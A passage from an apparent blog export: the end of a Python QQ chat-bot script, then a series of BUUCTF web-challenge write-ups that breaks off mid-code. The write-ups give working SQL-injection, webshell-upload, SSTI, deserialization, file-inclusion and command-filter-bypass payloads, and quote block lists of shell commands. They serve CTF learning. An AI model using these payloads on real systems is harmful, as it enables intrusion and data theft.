group.sendMessage(giveAdmin(gid,getQQ(message)),gid)\n    elif message[0:3]=='ban' and isAdmin(gid,uid):\n        group.sendMessage(ban(gid,getQQ(message)),gid)\n    elif message[0:5]=='unban' and isAdmin(gid,uid):\n        group.sendMessage(unban(gid,getQQ(message)),gid)\n    elif message=='/help':\n        group.sendMessage(help(),gid)\n    elif message[0:3]=='双色球':\n        group.sendMessage(theDoubleChromosphere(uid),gid)\n    elif message==\"签到\":\n        group.sendMessage(sign(gid,uid,nick),gid)\n    elif message==\"捞瓶子\":\n        group.sendMessage(getBottle(uid),gid)\n    elif message==\"我的瓶子\":\n        group.sendMessage(myBottles(uid),gid)\n    elif message[0:3]==\"摔瓶子\":\n        group.sendMessage(cleanBottles(message,uid),gid)\n    elif message==\"无内鬼\":\n        group.sendMessage(f\"[CQ:at,qq={uid}]穿件衣服吧你！你自己不恶sin吗？\",gid)\n    if re.search(r\"[\\(\\)（）]\",message):\n        group.sendMessage(buquan(message,uid),gid)\ndef keywordForPerson(message,uid):\n    if message[0:3]==\"扔瓶子\":\n        person.sendMessage(throwBottle(uid,message),uid)\n```\n\n```python\n#group.py\nimport json\nimport requests\n\n#保存用户信息\ndef saveGroupUserInfo(userInfo):\n    with open('userInfoOfGroup.json','w') as f:\n        json.dump(userInfo,f)\n#读取用户信息\ndef readGroupUserInfo():\n    with open('userInfoOfGroup.json','r') as f:\n        userInfo = json.load(f)\n    return userInfo\n#发送信息\ndef sendMessage(message,gid):\n    url=\"http://127.0.0.1:5700/send_msg?group_id=\"+str(gid)+\"&message=\"+message\n    requests.get(url)\n```\n\n","tags":["python"]},{"title":"BUUCTF记录1","url":"/posts/42117.html","content":"\n## [极客大挑战 2019]HardSQL\n\n首先尝试输入点东西\n\n结果![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.07.png)\n\n尝试万能密码![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.34.png)\n\n跑一下看看都过滤了啥\n\n```\n该字符是非法字符: union\n该字符是非法字符: and\n该字符是非法字符: sleep\n该字符是非法字符: by\n该字符是非法字符: if\n该字符是非法字符: char\n该字符是非法字符: ascii\n该字符是非法字符: mid\n该字符是非法字符: substring\n该字符是非法字符: handler\n该字符是非法字符: benchmark\n该字符是非法字符: insert\n该字符是非法字符: *\n该字符是非法字符: =\n该字符是非法字符: \\\n该字符是非法字符: 空格\n```\n\n只能尝试报错注入了\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n1'or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n```\n\n报错注入限制长度，用right函数切割\n\n\n\n\n\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n布尔盲注\n\n```python\nimport requests\nurl=\"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php\"\nflagchar=\"flag{-abcdef1234567890}\"\nfor i in range(1,50):\n    for j in flagchar:\n        data={\n            'id':f\"if(ascii(substr((select(flag)from(flag)),{i},1))={ord(j)},2,1)\"\n        }\n        tex=requests.post(url=url,data=data).text\n        if \"Do you want to be my girlfriend\" in tex:\n            print(j,end=\"\")\n            break\n```\n\n## [GXYCTF2019]BabyUpload\n\n首先尝试上传php文件，被过滤，尝试png图片，过滤，只能上传jpeg了，成功\n\n发现服务器是apache服务器，尝试上传.htaccess文件\n\n```\nAddType application/x-httpd-php .jpeg\n```\n\n成功![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.14.17.png)\n\n成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.18.24.png)\n\n蚁剑链接即可\n\n## [BUUCTF 2018]Online Tool\n\n上来两个函数escapeshellarg()和escapeshellcmd()\n\n```\nescapeshellarg()将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec(),system()执行运算符。\n```\n\n```\nescapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。反斜线（\\）会在以下字符之前插入：&#;`|*?~<>^()[]{}$,\\x0A和\\xFF。'和\"仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!字符都会被空格代替。\n```\n\n两个函数使用的例子\n\n```\n原始输入 172.17.0.2' -v -d a=1\nescapeshellarg处理后 '172.17.0.2''' -v -d a=1'\nescapeshellcmd处理后 '172.17.0.2'\\'' -v -d a=1'\n```\n\n在本题中，使用的nmap有一个名为-oG的参数选项，可以将nmap的命令和执行结果写入文件\n\n```\npayload:?host=' <?php @eval($_POST[\"kkk\"]);?> -oG kkk.php '\n```\n\n传入后变为\n\n```\nnmap -T5 -sT -Pn --host-timeout 2 -F ''<?php @eval($_POST[\"kkk\"]);?> -oG kkk.php''\n```\n\n## [BJDCTF2020]The mystery of ip\n\nSSTI模版注入，以后学了在理解吧\n\n```\nX-Forwarded-For: {{system(\"cat /flag\")}}\n```\n\n\n\n## [RoarCTF 2019]Easy Calc\n\nPHP字符串解析漏洞，查看数据包访问calc.php\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.29.28.png)\n\n尝试传入scandir()扫描文件，发现WAF阻挡，将传入参数由num改为 num，php获取到的参数名称为num而WAF获取到 num，绕过WAF成功，扫描发现在根目录下有f1agg文件，使用file_get_content函数读取文件即可\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.35.38.png)\n\n\n\n## [网鼎杯 2018]Fakebook\n\n首先注册后进入，发现no疑似存在SQL注入，尝试union select被过滤，尝试union/**/select成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.17.59.png)\n\n爆出回显位置，以及似乎网页对数据库内容进行了反序列化，稍后再看，先进行SQL注入爆出内容\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.19.45.png)\n\n发现用户信息是被序列化后存储在数据库中的，下一步应当尝试查看源码进行反序列化了，访问robots.txt发现了网站源码，源码对用户传入的博客链接进行访问并渲染，直接将链接改为本地文件并渲染，得到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.30.53.png)\n\n## [GXYCTF2019]禁止套娃\n\n首先看robots.txt发现没有内容，扫目录扫出.git，猜测有源码泄露，使用gitHack得到index.php\n\n```php\n//index.php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\n第一步过滤了所有伪协议，只能执行函数了，下一步查看正则，大佬的解释如下\n\n```\n(?R)是引用当前表达式，(?R)? 这里多一个?表示可以有引用，也可以没有。，引用一次正则则变成了[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\),可以迭代下去，那么它所匹配的就是print(echo(1))、a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子\n```\n\n最终我们就是要构造一个无参嵌套函数执行，首先尝试扫描文件，查看是否有flag文件存在\n\n知识点：localeconv函数返回一包含本地数字及货币格式信息的数组\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.15.48.png)\n\n通过这个函数第一项我们可以拿到.，进而可以使用scandir函数扫描目录文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.17.17.png)\n\n通过current取出第一位.，flag.php在倒数第二的位置，先使用array_reverse函数倒转排序，在使用next取第二位，使用hightlight_file读出文件\n\n```\npayload:?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.19.48.png)\n\n## [GWCTF 2019]我有一个数据库\n\n进去就告诉你数据库是空的，先扫个文件吧，发现有robots.txt和/phpmyadmin/，先看robots，提示去phpinfo.php，就是个phpinfo页面，也没啥提示，看phpmyadmin，数据库里还真没东西\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.25.46.png)\n\n看WP，发现是一个关于phpmyadmin的远程文件包含漏洞[CVE-2018-12613](https://blog.csdn.net/qq_43579362/article/details/108476182)\n\n出现bug的代码位置：phpMyAdmin/index.php\n\n![](https://img-blog.csdnimg.cn/20200908202849454.png)\n\n可以看到传入的target需要满足的条件：\n\n1、是字符串\n\n2、没有index\n\n3、不`target_blacklist`中\n\n4、满足`Core`类中`checkPageValidity`函数检查\n\n最后一个条件的有关代码如下\n\n![](https://img-blog.csdnimg.cn/20200908203030418.png)\n\n上述函数可知，如果想要函数返回真，需要满足以下三个条件的任意一个\n\n1、`$page`变量值在`$white_list`数组中\n\n2、经过`mb_substr()`和`mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n3、经过`urldecode(),mb_substr(),mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n![](https://img-blog.csdnimg.cn/20200908204934607.png)\n\n开始构造payload，先挑一个在whitelist中的文件db_datadict.php然后加问号和我们想要包含的文件\n\n```\npayload:?target=db_datadict.php%253f/../../../../../../../../../flag\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.45.08.png)\n\n## [网鼎杯 2020 朱雀组]phpweb\n\n打开网站查看源码，发现有一个延时5秒提交的参数，抓包查看参数名称发现可能是执行函数的东西，尝试highlight_file读取页面源码成功\n\n```php+HTML\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n过滤了大部分危险函数，继续看发现有一个Test类在销毁时会执行函数，可通过反序列化绕过函数禁用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.33.29.png)\n\n尝试构造成功，但没有发现flag，搜索一下发现在/tmp/flagoefiu4r93\n\n```\npayload:\nPOST\nfunc=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"tac /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.36.23.png)\n\n## [BSidesCF 2020]Had a bad day\n\n选猫猫或狗狗后url中出现注入点，尝试读取文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-25 23.42.45.png)\n\n似乎会自动补后缀，去掉.php，读取源码\n\n```php+HTML\n<?php\n\t$file = $_GET['category'];\n\tif(isset($file))\n\t{\n\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\"))\n    {\n\t\t\tinclude ($file . '.php');\n\t\t}\n\t\telse{\n\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t}\n\t}\n?>\n```\n\n包含的条件是参数中有woofers，meowers或者index，任选一个构造payload，再使用过滤器base64编码就可以\n\n```\npayload:?category=php://filter/convert.base64-encode/resource=index/../flag\n```\n\n## [BJDCTF2020]Mark loves cat\n\n啥也没有先扫吧，扫出.git，githack跑一下，看源码\n\n```PHP\n//index.php\n<?php\n\n$flag = file_get_contents('/flag');\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = $y;\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds);\n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);\n}\n\necho \"the flag is: \".$flag;\n```\n\n用第二个判断，$yds=$flag即可\n\n```\npayload:?yds=flag\n```\n\n## [强网杯 2019]高明的黑客\n\n下载源码，3000个文件，打开看内容中有许多eval函数，但是执行时内容不一定可用，编写脚本进行测试\n\n```python\nimport os\nimport requests\nimport re\npath=\"C:\\phpstudy_pro\\WWW\\src\\\\\"\nfiles=os.listdir(path)\nprint(path)\nfor i in files:\n    try:\n        with open(path+i,'r') as f:\n            gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read()))\n            posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read()))\n    except:\n        continue\n    data={}\n    parm={}\n    for j in gets:\n        parm[j]=\"echo 'jlanhere';\"\n    for j in posts:\n        data[j] = \"echo 'jlanhere';\"\n    tex=requests.post(url=f\"http://src/{i}\",data=data,params=parm).text\n    if \"jlanhere\" in tex:\n        tp={}\n        for k in gets:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.get(url=f\"http://src/{i}\",params=tp).text\n            if \"jlanhere\" in textt:\n                print(\"get\")\n                print(i)\n                print(k)\n                exit()\n        for k in posts:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.post(url=f\"http://src/{i}\",data=tp).text\n            if \"jlanhere\" in textt:\n                print(\"post\")\n                print(i)\n                print(k)\n                exit()\n```\n\n找出一个注入点\n\n```\npayload:\nxk0SzyKwfzw.php?Efa5BVG=cat /flag\n```\n\n拿到flag\n\n## [安洵杯 2019]easy_web\n\n看看传参，img的内容是被hex编码后再用两次base64编码得到的，解码内容如下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-26 23.02.28.png)\n\n尝试将index.php编码传入，得到源码\n\n```php+html\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n```\n\n直接看关键，md5强相等绕过\n\n```\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n或\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n然后就是命令绕过，使用反斜杠绕过cat\n\n```\npayload:?cmd=ca\\t /flag\nPOST:\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n## [BJDCTF2020]Cookie is so stable\n\n直接测试出SSTI，但是这个渲染框架不是flask的，灰溜溜去看wp，发现是php的twig渲染模版，直接在cookie处放payload即可\n\n```\npayload:\nCookie: user={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}\n```\n\n## [WUSTCTF2020]朴实无华\n\nrobots.txt->fAke_f1agggg.php->fl4g.php\n\n```PHP\n<?php \nheader('Content-type:text/html;charset=utf-8'); \nerror_reporting(0); \nhighlight_file(__file__); \n\n\n//level 1 \nif (isset($_GET['num'])){ \n    $num = $_GET['num']; \n    if(intval($num) < 2020 && intval($num + 1) > 2021){ \n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\"; \n    }else{ \n        die(\"金钱解决不了穷人的本质问题\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n//level 2 \nif (isset($_GET['md5'])){ \n   $md5=$_GET['md5']; \n   if ($md5==md5($md5)) \n       echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\"; \n   else \n       die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"); \n}else{ \n    die(\"去非洲吧\"); \n} \n\n//get flag \nif (isset($_GET['get_flag'])){ \n    $get_flag = $_GET['get_flag']; \n    if(!strstr($get_flag,\" \")){ \n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); \n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\"; \n        system($get_flag); \n    }else{ \n        die(\"快到非洲了\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n?> \n```\n\n首先intval函数特性\n\n```\nintval('2e4')=2\nintval('2e4'+1)=20001\n因为在执行下面的命令时相当于先执行了int('2e4')=20000再加一\n所以第一个绕过num=2e4即可\n```\n\n第二个md5弱相等绕过\n\n```\n$md5=md5($md5)\n开头是0e并且md5后也是0e即可\n0e215962017\n```\n\n最后空格绕过和cat绕过\n\n```\npayload:fl4g.php?num=2e4&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n```\n\n## [护网杯 2018]easy_tornado\n\n进去三个文件\n\n```\n/flag.txt：flag in /fllllllllllllag\n/welcome.txt：render\n/hints.txt：md5(cookie_secret+md5(filename))\n```\n\n点击文件查看链接传参，很明显是文件名和对应的`md5(cookie_secret+md5(filename))`所以我们需要找到`cookie_secret`这一变量的值，再看welcome中有render，怀疑是SSTI，更改传参内容，出现error页面，测试SSTI成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 22.29.11.png)\n\n在查找tornado获取环境变量在handler.settings中，直接构造\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 22.31.47.png)\n\n在按照hints中内容构造hash即可\n\n```\npayload:file?filename=/fllllllllllllag&filehash=da1ca88f71d944d0819a420a222fc69c\n```\n\n## [MRCTF2020]你传你🐎呢\n\nApache解析漏洞\n\n```\n#.htaccess\n<FilesMatch \"shell.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\n上传后蚁剑连接即可\n\n## [BJDCTF2020]ZJCTF，不过如此\n\n先看代码\n\n```php\n//index.php\n<?php\nerror_reporting(0);\n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"I have a dream\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        die(\"Not now!\");\n    }\n    include($file);  //next.php\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n构造先读取next.php中的内容\n\n```\n?file=php://filter/read=convert.base64-encode/resource=next.php&text=php://input\nPOST:\nI have a dream\n```\n\n```php\n//next.php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n\n这时候要用一个正则的漏洞[Preg_Replace代码执行漏洞解析](https://www.cesafe.com/html/6999.html)\n\n构造出正则内容为\n\nre=\\S*（多次匹配非空字符）\n\nstr=${phpinfo()}\n\n测试成功\n\n进而使用getFlag函数执行命令\n\n```\npayload:next.php?\\S*={${getFlag()}}&cmd=system('cat /flag');\n```\n\n## [De1CTF 2019]SSRF Me\n\n上来就是代码\n\n```python\n#! /usr/bin/env python\n# #encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if (not os.path.exists(self.sandbox)):\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta', methods=['GET', 'POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if (waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n\n@app.route('/')\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0', port=9999)\n\n\n```\n\n看代码关键点就是`Task`类中的函数执行，分析得出只要`action`中同时含有scan和read即可读取出文件并返回，而在`De1ta`路径中有创建`Task`类的过程，`geneSign`路径中可以获取sign值，所以让`action=scanread&parma=flag.txt`，通过`geneSign`路径获取sign即可，`getSign`函数中md5内容的拼接，是`secert_key + param + action`，而对于`geneSign`路径来说，action永远为scan，所以geneSign结果就是`secert_key + param + 'scan'`拼接出带有同时带有scan和read只要让`param=flag.txtread`即可，传入`geneSign`拿到sign值\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-29 15.50.50.png)\n\n最终payload如下\n\n```\npayload:De1ta?param=flag.txt\nCookie: action=readscan;sign=1983e9273c0ae452b67ccecb2fb88ed2;\n```\n\n## [网鼎杯 2020 朱雀组]Nmap\n\n详见该题：[BUUCTF 2018]Online Tool\n\n\n\n## [SWPU2019]Web1\n\n是SQL注入\n\n1、空格过滤\n\n2、注释符过滤\n\n3、[information_schema绕过](https://www.anquanke.com/post/id/193512)\n\n4、无列名注入\n\n第一个用/**/绕过就行\n\n第二个末尾加单引号闭合就行\n\n最后一个使用innodb引擎绕过\n\n条件是MySQL版本>5.5\n\n表名在innodb_table_stats\n\n列名在innodb_table_index\n\nselect table_name from mysql.innodb_table_stats where database_name=database()\n\n首先是测试列数，为22列，回显在2，3位，然后爆表名\n\n```\n-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)from(mysql.innodb_table_stats)where(database_name=database())),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n表名：ads，users\n\n无列名注入\n\n```text\nselect 1,2,3 union select * from admin;\n```\n\n这样的话union select的内容就是前三列的内容\n\n```text\nselect `3` from (select 1,2,3 union select * from admin)a;\n```\n\n或者\n\n```\nselect b from (select 1,2,3 as b union select * from admin)a;\n```\n\n这样就是第三列的内容\n\n```\npayload:-1'/**/union/**/select/**/1,(select/**/group_concat(b)from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n## [MRCTF2020]Ezpop\n\n```PHP\nWelcome to index.php\n<?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n}\n?>\n```\n\n反序列化不用多说，最后应该文件包含加PHP伪协议读取，找链子\n\n`__invoke`需要以函数调用类，在Test的`__get`方法中，`__get`方法在Show中`__toString`调用类中不存在的方法时会被调用，最终构造出的就是\n\n```PHP\n<?php\nclass Modifier{\n    protected $var = 